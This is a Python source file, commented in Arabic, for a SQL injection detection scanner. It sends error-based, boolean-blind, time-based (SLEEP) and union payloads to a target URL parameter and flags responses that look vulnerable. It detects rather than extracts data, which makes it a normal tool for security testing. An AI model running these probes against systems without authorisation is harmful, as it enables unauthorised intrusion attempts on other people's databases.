# SQL Injection Detector
# محرك الكشف عن ثغرات SQL Injection

import requests
import time
from payloads import Payloads
from colorama import Fore, Style, init
import re

init(autoreset=True)

class SQLDetector:
    """فئة الكشف عن ثغرات SQL Injection"""
    
    def __init__(self, timeout=10, headers=None):
        self.timeout = timeout
        self.headers = headers or {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        self.session = requests.Session()
    
    def test_basic_injection(self, url, param, method='GET', data=None):
        """فحص SQL Injection الأساسي"""
        print(f"{Fore.BLUE}[*] اختبار SQL Injection الأساسي...{Style.RESET_ALL}")
        
        for payload in Payloads.BASIC_PAYLOADS:
            try:
                if method.upper() == 'GET':
                    test_url = f"{url.split('?')[0]}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, headers=self.headers)
                else:
                    if data is None:
                        data = {param: payload}
                    else:
                        data[param] = payload
                    response = self.session.post(url, data=data, timeout=self.timeout, headers=self.headers)
                
                # فحص الأخطاء
                if self._check_error_signatures(response.text):
                    return {
                        'vulnerable': True,
                        'type': 'Error-based SQL Injection',
                        'parameter': param,
                        'payload': payload,
                        'response_length': len(response.text)
                    }
            except Exception as e:
                print(f"{Fore.RED}[-] خطأ: {e}{Style.RESET_ALL}")
                continue
        
        return {'vulnerable': False}
    
    def test_blind_injection(self, url, param, method='GET', data=None):
        """فحص Blind SQL Injection"""
        print(f"{Fore.BLUE}[*] اختبار Blind SQL Injection...{Style.RESET_ALL}")
        
        try:
            # احصل على الاستجابة العادية
            if method.upper() == 'GET':
                base_url = f"{url.split('?')[0]}?{param}=1"
                response_true = self.session.get(base_url, timeout=self.timeout, headers=self.headers)
            else:
                if data is None:
                    data = {param: '1'}
                else:
                    data[param] = '1'
                response_true = self.session.post(url, data=data, timeout=self.timeout, headers=self.headers)
            
            base_length = len(response_true.text)
            
            # اختبر مع شرط FALSE
            if method.upper() == 'GET':
                false_url = f"{url.split('?')[0]}?{param}=1' AND 1=2 --"
                response_false = self.session.get(false_url, timeout=self.timeout, headers=self.headers)
            else:
                false_data = data.copy()
                false_data[param] = "1' AND 1=2 --"
                response_false = self.session.post(url, data=false_data, timeout=self.timeout, headers=self.headers)
            
            # إذا كان الفرق واضحاً، فهناك ثغرة
            if abs(len(response_true.text) - len(response_false.text)) > 10:
                return {
                    'vulnerable': True,
                    'type': 'Boolean-based Blind SQL Injection',
                    'parameter': param,
                    'payload': "1' AND 1=2 --"
                }
        except Exception as e:
            print(f"{Fore.RED}[-] خطأ: {e}{Style.RESET_ALL}")
        
        return {'vulnerable': False}
    
    def test_time_based_injection(self, url, param, method='GET', data=None):
        """فحص Time-based SQL Injection"""
        print(f"{Fore.BLUE}[*] اختبار Time-based SQL Injection...{Style.RESET_ALL}")
        
        payload = "' AND SLEEP(5) --"
        
        try:
            if method.upper() == 'GET':
                test_url = f"{url.split('?')[0]}?{param}={payload}"
                start = time.time()
                response = self.session.get(test_url, timeout=self.timeout, headers=self.headers)
                elapsed = time.time() - start
            else:
                if data is None:
                    data = {param: payload}
                else:
                    data[param] = payload
                start = time.time()
                response = self.session.post(url, data=data, timeout=self.timeout, headers=self.headers)
                elapsed = time.time() - start
            
            # إذا استغرقت 5 ثواني أو أكثر، فهناك ثغرة
            if elapsed >= 4.5:
                return {
                    'vulnerable': True,
                    'type': 'Time-based Blind SQL Injection',
                    'parameter': param,
                    'payload': payload,
                    'time': elapsed
                }
        except requests.Timeout:
            # إذا timeout، قد تكون هناك ثغرة
            return {
                'vulnerable': True,
                'type': 'Time-based Blind SQL Injection',
                'parameter': param,
                'payload': payload
            }
        except Exception as e:
            print(f"{Fore.RED}[-] خطأ: {e}{Style.RESET_ALL}")
        
        return {'vulnerable': False}
    
    def test_union_injection(self, url, param, method='GET', data=None):
        """فحص Union-based SQL Injection"""
        print(f"{Fore.BLUE}[*] اختبار Union-based SQL Injection...{Style.RESET_ALL}")
        
        for payload in Payloads.UNION_PAYLOADS:
            try:
                if method.upper() == 'GET':
                    test_url = f"{url.split('?')[0]}?{param}={payload}"
                    response = self.session.get(test_url, timeout=self.timeout, headers=self.headers)
                else:
                    if data is None:
                        data = {param: payload}
                    else:
                        data[param] = payload
                    response = self.session.post(url, data=data, timeout=self.timeout, headers=self.headers)
                
                # فحص الأخطاء
                if self._check_error_signatures(response.text):
                    return {
                        'vulnerable': True,
                        'type': 'Union-based SQL Injection',
                        'parameter': param,
                        'payload': payload
                    }
            except Exception as e:
                continue
        
        return {'vulnerable': False}
    
    def _check_error_signatures(self, response_text):
        """فحص توقيعات الأخطاء"""
        for signature in Payloads.ERROR_SIGNATURES:
            if signature.lower() in response_text.lower():
                return True
        return False
    
    def scan(self, url, param, method='GET', data=None, advanced=False):
        """فحص شامل"""
        print(f"{Fore.GREEN}[+] بدء الفحص...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Parameter: {param}{Style.RESET_ALL}\n")
        
        # اختبار أساسي
        result = self.test_error_based_injection(url, param, method, data)
        if result['vulnerable']:
            return result
        
        # اختبار Boolean-based
        result = self.test_blind_injection(url, param, method, data)
        if result['vulnerable']:
            return result
        
        # اختبار Time-based
        result = self.test_time_based_injection(url, param, method, data)
        if result['vulnerable']:
            return result
        
        if advanced:
            # اختبار Union-based
            result = self.test_union_injection(url, param, method, data)
            if result['vulnerable']:
                return result
        
        print(f"{Fore.GREEN}[✓] اكتمل الفحص{Style.RESET_ALL}")
        return {'vulnerable': False, 'message': 'لم يتم العثور على ثغرات'}
    
    def test_error_based_injection(self, url, param, method='GET', data=None):
        """فحص Error-based SQL Injection"""
        return self.test_basic_injection(url, param, method, data)
